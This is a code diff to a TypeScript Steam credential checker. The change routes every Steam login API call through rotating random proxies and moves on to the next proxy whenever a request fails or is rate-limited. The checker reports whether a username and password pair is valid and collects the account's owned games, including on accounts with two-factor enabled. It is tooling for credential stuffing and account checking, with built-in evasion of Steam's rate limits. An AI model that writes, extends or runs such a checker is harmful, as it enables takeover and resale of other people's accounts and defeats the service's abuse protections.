@@ -1,6 +1,7 @@
 // @ts-nocheck
 import crypto from "crypto";
 import { logger } from "./logger";
+import { pickProxies, fetchViaProxy } from "./proxyManager";
 
 const USER_AGENTS = [
   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
@@ -28,29 +29,48 @@ function encryptPassword(password: string, modHex: string, expHex: string): stri
     n: Buffer.from(padded, "hex").toString("base64url"),
     e: Buffer.from(paddedExp, "hex").toString("base64url"),
   };
-  // eslint-disable-next-line @typescript-eslint/no-explicit-any
   const key = crypto.createPublicKey({ key: jwk as any, format: "jwk" });
   return crypto
     .publicEncrypt({ key, padding: crypto.constants.RSA_PKCS1_PADDING }, Buffer.from(password, "utf8"))
     .toString("base64");
 }
 
-async function getRsaKey(username: string): Promise<{ mod: string; exp: string; timestamp: string } | null> {
+/* ============================
+   Proxy-aware Steam API calls
+   ============================ */
+
+async function getRsaKey(
+  username: string,
+  proxies: Awaited<ReturnType<typeof pickProxies>>,
+  proxyIndex: number = 0,
+): Promise<{ mod: string; exp: string; timestamp: string; proxyIndex: number } | null> {
+  if (proxyIndex >= proxies.length) return null;
+  const proxy = proxies[proxyIndex] ?? null;
   try {
     const url = new URL("https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/");
     url.searchParams.set("account_name", username);
-    const res = await fetch(url.toString(), {
-      headers: makeHeaders(),
-      signal: AbortSignal.timeout(15_000),
-    });
-    if (res.status !== 200) return null;
+    const res = await fetchViaProxy(
+      url.toString(),
+      { headers: makeHeaders(), signal: AbortSignal.timeout(15_000) },
+      proxy,
+    );
+    if (res === null) {
+      logger.warn({ proxyIndex, proxy: proxy?.url }, "getRsaKey proxy failed — trying next");
+      return getRsaKey(username, proxies, proxyIndex + 1);
+    }
+    if (res.status !== 200) {
+      logger.warn({ status: res.status, proxyIndex }, "getRsaKey bad status — trying next proxy");
+      return getRsaKey(username, proxies, proxyIndex + 1);
+    }
     const data = await res.json() as Record<string, Record<string, string>>;
     const r = data.response ?? {};
-    if (!r.publickey_mod) return null;
-    return { mod: r.publickey_mod, exp: r.publickey_exp, timestamp: r.timestamp };
+    if (!r.publickey_mod) {
+      return getRsaKey(username, proxies, proxyIndex + 1);
+    }
+    return { mod: r.publickey_mod, exp: r.publickey_exp, timestamp: r.timestamp, proxyIndex };
   } catch (e) {
-    logger.warn({ err: e }, "getRsaKey failed");
-    return null;
+    logger.warn({ err: e, proxyIndex }, "getRsaKey exception — trying next proxy");
+    return getRsaKey(username, proxies, proxyIndex + 1);
   }
 }
 
@@ -58,7 +78,11 @@ async function beginAuthSession(
   username: string,
   encPassword: string,
   timestamp: string,
-): Promise<Record<string, unknown> | null> {
+  proxies: Awaited<ReturnType<typeof pickProxies>>,
+  proxyIndex: number = 0,
+): Promise<{ response: Record<string, unknown>; proxyIndex: number } | null> {
+  if (proxyIndex >= proxies.length) return null;
+  const proxy = proxies[proxyIndex] ?? null;
   try {
     const body = new URLSearchParams({
       account_name: username,
@@ -68,7 +92,7 @@ async function beginAuthSession(
       platform_type: "2",
       website_id: "Community",
     });
-    const res = await fetch(
+    const res = await fetchViaProxy(
       "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/",
       {
         method: "POST",
@@ -76,27 +100,43 @@ async function beginAuthSession(
         body: body.toString(),
         signal: AbortSignal.timeout(15_000),
       },
+      proxy,
     );
+    if (res === null) {
+      logger.warn({ proxyIndex }, "BeginAuth proxy failed — trying next");
+      return beginAuthSession(username, encPassword, timestamp, proxies, proxyIndex + 1);
+    }
     const text = await res.text();
-    logger.info({ status: res.status, preview: text.slice(0, 200) }, "BeginAuthSession");
+    logger.info({ status: res.status, preview: text.slice(0, 200), proxyIndex }, "BeginAuthSession");
     if (res.status === 200) {
       const data = JSON.parse(text) as Record<string, unknown>;
-      return (data.response as Record<string, unknown>) ?? {};
+      return { response: (data.response as Record<string, unknown>) ?? {}, proxyIndex };
     }
     if (res.status === 400) {
-      return {};
+      return { response: {}, proxyIndex };
     }
-    if (res.status === 429) return null;
+    if (res.status === 429) {
+      logger.warn({ proxyIndex }, "BeginAuth rate limited — trying next proxy");
+      return beginAuthSession(username, encPassword, timestamp, proxies, proxyIndex + 1);
+    }
+    return beginAuthSession(username, encPassword, timestamp, proxies, proxyIndex + 1);
   } catch (e) {
-    logger.warn({ err: e }, "beginAuthSession failed");
+    logger.warn({ err: e, proxyIndex }, "BeginAuth exception — trying next proxy");
+    return beginAuthSession(username, encPassword, timestamp, proxies, proxyIndex + 1);
   }
-  return null;
 }
 
-async function pollAuthSession(clientId: string, requestId: string): Promise<Record<string, unknown> | null> {
+async function pollAuthSession(
+  clientId: string,
+  requestId: string,
+  proxies: Awaited<ReturnType<typeof pickProxies>>,
+  proxyIndex: number = 0,
+): Promise<Record<string, unknown> | null> {
+  if (proxyIndex >= proxies.length) return null;
+  const proxy = proxies[proxyIndex] ?? null;
   try {
     const body = new URLSearchParams({ client_id: clientId, request_id: requestId });
-    const res = await fetch(
+    const res = await fetchViaProxy(
       "https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1/",
       {
         method: "POST",
@@ -104,64 +144,88 @@ async function pollAuthSession(clientId: string, requestId: string): Promise<Rec
         body: body.toString(),
         signal: AbortSignal.timeout(15_000),
       },
+      proxy,
     );
+    if (res === null) {
+      return pollAuthSession(clientId, requestId, proxies, proxyIndex + 1);
+    }
     if (res.status === 200) {
       const data = await res.json() as Record<string, unknown>;
       return (data.response as Record<string, unknown>) ?? {};
     }
+    return pollAuthSession(clientId, requestId, proxies, proxyIndex + 1);
   } catch (e) {
-    logger.warn({ err: e }, "pollAuthSession failed");
+    logger.warn({ err: e, proxyIndex }, "pollAuthSession exception — trying next proxy");
+    return pollAuthSession(clientId, requestId, proxies, proxyIndex + 1);
   }
-  return null;
 }
 
-async function finalizeLogin(refreshToken: string, sessionid: string): Promise<boolean> {
+async function finalizeLogin(
+  refreshToken: string,
+  sessionid: string,
+  proxies: Awaited<ReturnType<typeof pickProxies>>,
+  proxyIndex: number = 0,
+): Promise<boolean> {
+  if (proxyIndex >= proxies.length) return false;
+  const proxy = proxies[proxyIndex] ?? null;
   try {
     const body = new URLSearchParams({
       nonce: refreshToken,
       sessionid,
       redir: "https://steamcommunity.com/login/home/?goto=",
     });
-    const res = await fetch("https://login.steampowered.com/jwt/finalizelogin", {
-      method: "POST",
-      headers: makeHeaders({ "Content-Type": "application/x-www-form-urlencoded" }),
-      body: body.toString(),
-      signal: AbortSignal.timeout(15_000),
-    });
-    return res.status === 200;
+    const res = await fetchViaProxy(
+      "https://login.steampowered.com/jwt/finalizelogin",
+      {
+        method: "POST",
+        headers: makeHeaders({ "Content-Type": "application/x-www-form-urlencoded" }),
+        body: body.toString(),
+        signal: AbortSignal.timeout(15_000),
+      },
+      proxy,
+    );
+    return res !== null && res.status === 200;
   } catch (e) {
-    logger.warn({ err: e }, "finalizeLogin failed");
-    return false;
+    logger.warn({ err: e, proxyIndex }, "finalizeLogin exception — trying next proxy");
+    return finalizeLogin(refreshToken, sessionid, proxies, proxyIndex + 1);
   }
 }
 
-async function getOwnedGames(steamid64: string, accessToken?: string): Promise<string[]> {
+async function getOwnedGames(
+  steamid64: string,
+  accessToken?: string,
+  proxies?: Awaited<ReturnType<typeof pickProxies>>,
+  proxyIndex: number = 0,
+): Promise<string[]> {
   if (!steamid64) return [];
 
-  if (accessToken) {
+  if (accessToken && proxies && proxyIndex < proxies.length) {
+    const proxy = proxies[proxyIndex] ?? null;
     try {
       const url = new URL("https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/");
       url.searchParams.set("access_token", accessToken);
       url.searchParams.set("steamid", steamid64);
       url.searchParams.set("include_appinfo", "1");
-      const res = await fetch(url.toString(), {
-        headers: makeHeaders(),
-        signal: AbortSignal.timeout(20_000),
-      });
-      if (res.status === 200) {
+      const res = await fetchViaProxy(
+        url.toString(),
+        { headers: makeHeaders(), signal: AbortSignal.timeout(20_000) },
+        proxy,
+      );
+      if (res !== null && res.status === 200) {
         const data = await res.json() as Record<string, unknown>;
         const r = (data.response ?? {}) as Record<string, unknown>;
         const games = (r.games ?? []) as Array<Record<string, unknown>>;
         const names = games.map((g) => String(g.name ?? "")).filter(Boolean);
-        logger.info({ count: names.length }, "GetOwnedGames API success");
+        logger.info({ count: names.length, proxyIndex }, "GetOwnedGames API success via proxy");
         return names;
       }
     } catch (e) {
-      logger.warn({ err: e }, "GetOwnedGames API failed");
+      logger.warn({ err: e, proxyIndex }, "GetOwnedGames API proxy failed — trying next");
+      return getOwnedGames(steamid64, accessToken, proxies, proxyIndex + 1);
     }
   }
 
-  // HTML fallback (works when library is public)
+  // HTML fallback (no proxy needed — works if library is public)
   try {
     const url = `https://steamcommunity.com/profiles/${steamid64}/games/?tab=all`;
     const res = await fetch(url, {
@@ -182,7 +246,6 @@ async function getOwnedGames(steamid64: string, accessToken?: string): Promise<s
             if (depth === 0) { end = i + 1; break; }
           }
           const gamesData = JSON.parse(html.slice(start, end)) as Array<Record<string, unknown>>;
-          // Filter out free-to-play games: they have hours_forever="0" and last_played=0
           const names = gamesData
             .filter((g) => {
               const hours = Number(String(g.hours_forever ?? "0").replace(/,/g, ""));
@@ -202,6 +265,10 @@ async function getOwnedGames(steamid64: string, accessToken?: string): Promise<s
   return [];
 }
 
+/* ============================
+   Main credential checker
+   ============================ */
+
 export type CheckResult =
   | { status: "valid"; message: string; games: string[]; steamid: string }
   | { status: "invalid"; message: string; games: string[]; steamid: string }
@@ -209,43 +276,48 @@ export type CheckResult =
   | { status: "error"; message: string; games: string[]; steamid: string };
 
 export async function checkSteamCredentials(username: string, password: string): Promise<CheckResult> {
+  // Pick a fresh batch of 3 random proxies for this credential check
+  const proxies = await pickProxies(3);
+  logger.info({ count: proxies.length, usernames: proxies.map((p) => `${p.host}:${p.port}`) }, "Proxy pool for this check");
+
+  if (proxies.length === 0) {
+    logger.warn("No proxies available — falling back to direct connection");
+  }
+
   for (let attempt = 0; attempt < 3; attempt++) {
     try {
       logger.info({ username, attempt }, "Steam check — getting RSA key");
-      const rsa = await getRsaKey(username);
+      const rsa = await getRsaKey(username, proxies);
       if (!rsa) {
-        logger.warn({ attempt }, "getRsaKey returned null — retrying");
+        logger.warn({ attempt }, "getRsaKey returned null on all proxies — retrying");
         await new Promise((r) => setTimeout(r, 2000));
         continue;
       }
 
       const encPassword = encryptPassword(password, rsa.mod, rsa.exp);
 
-      const auth = await beginAuthSession(username, encPassword, rsa.timestamp);
+      const auth = await beginAuthSession(username, encPassword, rsa.timestamp, proxies, rsa.proxyIndex);
       if (auth === null) {
-        logger.warn({ attempt }, "BeginAuth rate limited — retrying");
+        logger.warn({ attempt }, "BeginAuth failed on all proxies — retrying");
         await new Promise((r) => setTimeout(r, 3000));
         continue;
       }
 
-      if (!auth || Object.keys(auth).length === 0) {
+      if (!auth.response || Object.keys(auth.response).length === 0) {
         return { status: "invalid", message: "Wrong username or password", games: [], steamid: "" };
       }
 
-      const steamid64 = String(auth.steamid ?? "");
-      const clientId = String(auth.client_id ?? "");
-      const requestId = String(auth.request_id ?? "");
-      const confirmations = (auth.allowed_confirmations ?? []) as Array<Record<string, unknown>>;
+      const steamid64 = String(auth.response.steamid ?? "");
+      const clientId = String(auth.response.client_id ?? "");
+      const requestId = String(auth.response.request_id ?? "");
+      const confirmations = (auth.response.allowed_confirmations ?? []) as Array<Record<string, unknown>>;
       const confTypes = new Set(confirmations.map((c) => Number(c.confirmation_type)));
 
-      logger.info({ username, steamid64, confTypes: [...confTypes] }, "BeginAuth OK");
+      logger.info({ username, steamid64, confTypes: [...confTypes], proxyIndex: auth.proxyIndex }, "BeginAuth OK");
 
       // confirmation_type 3 = Mobile authenticator (2FA), 4 = Device confirmation (2FA)
-      // 1 = None needed, 2 = Email code (still 1FA — can poll immediately)
       if (confTypes.has(3) || confTypes.has(4)) {
-        // 2FA is on — password IS correct, but we can't get tokens
-        // Still try HTML fallback for games (works if library is public)
-        const games = await getOwnedGames(steamid64);
+        const games = await getOwnedGames(steamid64, undefined, proxies, auth.proxyIndex);
         return {
           status: "valid",
           message: `Account verified (2FA enabled) — ${games.length} game${games.length !== 1 ? "s" : ""} found`,
@@ -255,7 +327,7 @@ export async function checkSteamCredentials(username: string, password: string):
       }
 
       // No 2FA — poll for tokens
-      const poll = await pollAuthSession(clientId, requestId);
+      const poll = await pollAuthSession(clientId, requestId, proxies, auth.proxyIndex);
       if (!poll) {
         return { status: "error", message: "Poll failed after auth", games: [], steamid: steamid64 };
       }
@@ -267,11 +339,10 @@ export async function checkSteamCredentials(username: string, password: string):
         return { status: "error", message: "No refresh token received", games: [], steamid: steamid64 };
       }
 
-      // Finalize (best-effort — not blocking on result)
       const sessionid = [...Array(24)].map(() => Math.floor(Math.random() * 16).toString(16)).join("");
-      await finalizeLogin(refreshToken, sessionid);
+      await finalizeLogin(refreshToken, sessionid, proxies, auth.proxyIndex);
 
-      const games = await getOwnedGames(steamid64, accessToken || undefined);
+      const games = await getOwnedGames(steamid64, accessToken || undefined, proxies, auth.proxyIndex);
 
       return {
         status: "valid",
